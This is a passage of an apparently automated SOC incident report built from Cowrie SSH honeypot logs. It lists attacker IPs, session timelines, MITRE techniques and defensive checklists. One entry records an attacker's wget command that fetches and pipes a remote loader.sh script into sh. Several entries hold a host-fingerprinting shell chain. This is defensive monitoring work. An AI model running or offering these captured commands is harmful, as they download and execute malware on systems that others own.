| `2026-07-24 04:10:59` | `cowrie.client.kex` |
| `2026-07-24 04:11:01` | `cowrie.login.success` |
| `2026-07-24 04:11:01` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.24.210[.]58` to AbuseIPDB if not already reported
- [ ] Block `72.24.210[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c038c7926ed

| Field | Detail |
|---|---|
| **Source IP** | `106.112.194[.]160` |
| **First Seen** | 2026-07-24 04:11 |
| **Last Seen** | 2026-07-24 04:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:11:02` | `cowrie.session.connect` |
| `2026-07-24 04:11:03` | `cowrie.client.version` |
| `2026-07-24 04:11:03` | `cowrie.client.kex` |
| `2026-07-24 04:11:05` | `cowrie.login.success` |
| `2026-07-24 04:11:06` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.112.194[.]160` to AbuseIPDB if not already reported
- [ ] Block `106.112.194[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a34c69b5dfe

| Field | Detail |
|---|---|
| **Source IP** | `31.41.84[.]98` |
| **First Seen** | 2026-07-24 04:11 |
| **Last Seen** | 2026-07-24 04:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:11:06` | `cowrie.session.connect` |
| `2026-07-24 04:11:06` | `cowrie.client.version` |
| `2026-07-24 04:11:06` | `cowrie.client.kex` |
| `2026-07-24 04:11:06` | `cowrie.login.success` |
| `2026-07-24 04:11:07` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.84[.]98` to AbuseIPDB if not already reported
- [ ] Block `31.41.84[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8fcec9a2027

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-24 04:11 |
| **Last Seen** | 2026-07-24 04:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:11:11` | `cowrie.session.connect` |
| `2026-07-24 04:11:12` | `cowrie.client.version` |
| `2026-07-24 04:11:12` | `cowrie.client.kex` |
| `2026-07-24 04:11:14` | `cowrie.login.success` |
| `2026-07-24 04:11:14` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cd9b3c3828

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:11 |
| **Last Seen** | 2026-07-24 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:11:36` | `cowrie.session.connect` |
| `2026-07-24 04:11:36` | `cowrie.client.version` |
| `2026-07-24 04:11:36` | `cowrie.client.kex` |
| `2026-07-24 04:11:36` | `cowrie.login.success` |
| `2026-07-24 04:11:37` | `cowrie.session.params` |
| `2026-07-24 04:11:37` | `cowrie.command.input` |
| `2026-07-24 04:11:37` | `cowrie.log.closed` |
| `2026-07-24 04:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9209866146af

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:13 |
| **Last Seen** | 2026-07-24 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:13:12` | `cowrie.session.connect` |
| `2026-07-24 04:13:12` | `cowrie.client.version` |
| `2026-07-24 04:13:12` | `cowrie.client.kex` |
| `2026-07-24 04:13:12` | `cowrie.login.success` |
| `2026-07-24 04:13:13` | `cowrie.session.params` |
| `2026-07-24 04:13:13` | `cowrie.command.input` |
| `2026-07-24 04:13:13` | `cowrie.log.closed` |
| `2026-07-24 04:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eae67e9dad3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:14 |
| **Last Seen** | 2026-07-24 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:14:52` | `cowrie.session.connect` |
| `2026-07-24 04:14:52` | `cowrie.client.version` |
| `2026-07-24 04:14:52` | `cowrie.client.kex` |
| `2026-07-24 04:14:52` | `cowrie.login.success` |
| `2026-07-24 04:14:53` | `cowrie.session.params` |
| `2026-07-24 04:14:53` | `cowrie.command.input` |
| `2026-07-24 04:14:53` | `cowrie.log.closed` |
| `2026-07-24 04:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb30a641342

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:16 |
| **Last Seen** | 2026-07-24 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:16:30` | `cowrie.session.connect` |
| `2026-07-24 04:16:30` | `cowrie.client.version` |
| `2026-07-24 04:16:30` | `cowrie.client.kex` |
| `2026-07-24 04:16:31` | `cowrie.login.success` |
| `2026-07-24 04:16:32` | `cowrie.session.params` |
| `2026-07-24 04:16:32` | `cowrie.command.input` |
| `2026-07-24 04:16:32` | `cowrie.log.closed` |
| `2026-07-24 04:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43bb00834d1a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:18 |
| **Last Seen** | 2026-07-24 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:18:05` | `cowrie.session.connect` |
| `2026-07-24 04:18:05` | `cowrie.client.version` |
| `2026-07-24 04:18:05` | `cowrie.client.kex` |
| `2026-07-24 04:18:05` | `cowrie.login.success` |
| `2026-07-24 04:18:06` | `cowrie.session.params` |
| `2026-07-24 04:18:06` | `cowrie.command.input` |
| `2026-07-24 04:18:06` | `cowrie.log.closed` |
| `2026-07-24 04:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68495472903

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:19 |
| **Last Seen** | 2026-07-24 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:19:45` | `cowrie.session.connect` |
| `2026-07-24 04:19:45` | `cowrie.client.version` |
| `2026-07-24 04:19:45` | `cowrie.client.kex` |
| `2026-07-24 04:19:45` | `cowrie.login.success` |
| `2026-07-24 04:19:46` | `cowrie.session.params` |
| `2026-07-24 04:19:46` | `cowrie.command.input` |
| `2026-07-24 04:19:46` | `cowrie.log.closed` |
| `2026-07-24 04:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39f768dc4def

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 04:20 |
| **Last Seen** | 2026-07-24 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:20:48` | `cowrie.session.connect` |
| `2026-07-24 04:20:48` | `cowrie.client.version` |
| `2026-07-24 04:20:48` | `cowrie.client.kex` |
| `2026-07-24 04:20:48` | `cowrie.login.success` |
| `2026-07-24 04:20:48` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:20:48` | `cowrie.direct-tcpip.data` |
| `2026-07-24 04:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e08c17f24d2

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]109` |
| **First Seen** | 2026-07-24 04:21 |
| **Last Seen** | 2026-07-24 04:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:21:32` | `cowrie.session.connect` |
| `2026-07-24 04:21:33` | `cowrie.client.version` |
| `2026-07-24 04:21:33` | `cowrie.client.kex` |
| `2026-07-24 04:21:35` | `cowrie.login.success` |
| `2026-07-24 04:21:36` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]109` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2c59ff0162

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:21 |
| **Last Seen** | 2026-07-24 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:21:32` | `cowrie.session.connect` |
| `2026-07-24 04:21:32` | `cowrie.client.version` |
| `2026-07-24 04:21:32` | `cowrie.client.kex` |
| `2026-07-24 04:21:33` | `cowrie.login.success` |
| `2026-07-24 04:21:34` | `cowrie.session.params` |
| `2026-07-24 04:21:34` | `cowrie.command.input` |
| `2026-07-24 04:21:34` | `cowrie.log.closed` |
| `2026-07-24 04:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c399af7be937

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:23 |
| **Last Seen** | 2026-07-24 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:23:15` | `cowrie.session.connect` |
| `2026-07-24 04:23:15` | `cowrie.client.version` |
| `2026-07-24 04:23:15` | `cowrie.client.kex` |
| `2026-07-24 04:23:16` | `cowrie.login.success` |
| `2026-07-24 04:23:16` | `cowrie.session.params` |
| `2026-07-24 04:23:16` | `cowrie.command.input` |
| `2026-07-24 04:23:16` | `cowrie.log.closed` |
| `2026-07-24 04:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eddc0c541ac3

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]50` |
| **First Seen** | 2026-07-24 04:24 |
| **Last Seen** | 2026-07-24 04:24 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:24:38` | `cowrie.session.connect` |
| `2026-07-24 04:24:43` | `cowrie.client.version` |
| `2026-07-24 04:24:43` | `cowrie.client.kex` |
| `2026-07-24 04:24:50` | `cowrie.login.success` |
| `2026-07-24 04:24:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]50` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43fae7f95468

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:24 |
| **Last Seen** | 2026-07-24 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:24:57` | `cowrie.session.connect` |
| `2026-07-24 04:24:57` | `cowrie.client.version` |
| `2026-07-24 04:24:57` | `cowrie.client.kex` |
| `2026-07-24 04:24:57` | `cowrie.login.success` |
| `2026-07-24 04:24:58` | `cowrie.session.params` |
| `2026-07-24 04:24:58` | `cowrie.command.input` |
| `2026-07-24 04:24:58` | `cowrie.log.closed` |
| `2026-07-24 04:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c1003aeeb2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:26 |
| **Last Seen** | 2026-07-24 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:26:39` | `cowrie.session.connect` |
| `2026-07-24 04:26:39` | `cowrie.client.version` |
| `2026-07-24 04:26:39` | `cowrie.client.kex` |
| `2026-07-24 04:26:39` | `cowrie.login.success` |
| `2026-07-24 04:26:40` | `cowrie.session.params` |
| `2026-07-24 04:26:40` | `cowrie.command.input` |
| `2026-07-24 04:26:40` | `cowrie.log.closed` |
| `2026-07-24 04:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbe7a7e1ab5a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:28 |
| **Last Seen** | 2026-07-24 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:28:19` | `cowrie.session.connect` |
| `2026-07-24 04:28:19` | `cowrie.client.version` |
| `2026-07-24 04:28:19` | `cowrie.client.kex` |
| `2026-07-24 04:28:20` | `cowrie.login.success` |
| `2026-07-24 04:28:20` | `cowrie.session.params` |
| `2026-07-24 04:28:20` | `cowrie.command.input` |
| `2026-07-24 04:28:20` | `cowrie.log.closed` |
| `2026-07-24 04:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e14bb5772635

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:29 |
| **Last Seen** | 2026-07-24 04:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:29:22` | `cowrie.session.connect` |
| `2026-07-24 04:29:23` | `cowrie.client.version` |
| `2026-07-24 04:29:23` | `cowrie.client.kex` |
| `2026-07-24 04:29:27` | `cowrie.login.success` |
| `2026-07-24 04:29:29` | `cowrie.session.params` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.success` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:29` | `cowrie.command.input` |
| `2026-07-24 04:29:31` | `cowrie.log.closed` |
| `2026-07-24 04:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412e16f83eb9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:29 |
| **Last Seen** | 2026-07-24 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:29:56` | `cowrie.session.connect` |
| `2026-07-24 04:29:56` | `cowrie.client.version` |
| `2026-07-24 04:29:56` | `cowrie.client.kex` |
| `2026-07-24 04:29:56` | `cowrie.login.success` |
| `2026-07-24 04:29:57` | `cowrie.session.params` |
| `2026-07-24 04:29:57` | `cowrie.command.input` |
| `2026-07-24 04:29:57` | `cowrie.log.closed` |
| `2026-07-24 04:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fa11a08b4d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:31 |
| **Last Seen** | 2026-07-24 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:31:32` | `cowrie.session.connect` |
| `2026-07-24 04:31:32` | `cowrie.client.version` |
| `2026-07-24 04:31:32` | `cowrie.client.kex` |
| `2026-07-24 04:31:33` | `cowrie.login.success` |
| `2026-07-24 04:31:33` | `cowrie.session.params` |
| `2026-07-24 04:31:33` | `cowrie.command.input` |
| `2026-07-24 04:31:34` | `cowrie.log.closed` |
| `2026-07-24 04:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff73f9bb9ac9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]195` |
| **First Seen** | 2026-07-24 04:31 |
| **Last Seen** | 2026-07-24 04:33 |
| **Session Duration** | 105s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `su, shell, uname -a, cd /var/run || cd /mnt || cd /root || cd /; wget -qO- hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh | sh -s 164.215.103[.]113` |
| **Download Attempts** | hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:31:47` | `cowrie.session.connect` |
| `2026-07-24 04:31:48` | `cowrie.login.success` |
| `2026-07-24 04:31:49` | `cowrie.session.params` |
| `2026-07-24 04:31:49` | `cowrie.command.input` |
| `2026-07-24 04:31:50` | `cowrie.command.input` |
| `2026-07-24 04:31:50` | `cowrie.command.failed` |
| `2026-07-24 04:31:50` | `cowrie.command.input` |
| `2026-07-24 04:31:52` | `cowrie.command.input` |
| `2026-07-24 04:31:53` | `cowrie.session.file_download` |
| `2026-07-24 04:33:32` | `cowrie.log.closed` |
| `2026-07-24 04:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]195` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d668c6f74f7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:31 |
| **Last Seen** | 2026-07-24 04:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:31:50` | `cowrie.session.connect` |
| `2026-07-24 04:31:50` | `cowrie.client.version` |
| `2026-07-24 04:31:50` | `cowrie.client.kex` |
| `2026-07-24 04:31:54` | `cowrie.login.success` |
| `2026-07-24 04:31:56` | `cowrie.session.params` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.success` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:56` | `cowrie.command.input` |
| `2026-07-24 04:31:57` | `cowrie.log.closed` |
| `2026-07-24 04:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0afab3d8cac

| Field | Detail |
|---|---|
| **Source IP** | `112.120.115[.]152` |
| **First Seen** | 2026-07-24 04:31 |
| **Last Seen** | 2026-07-24 04:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
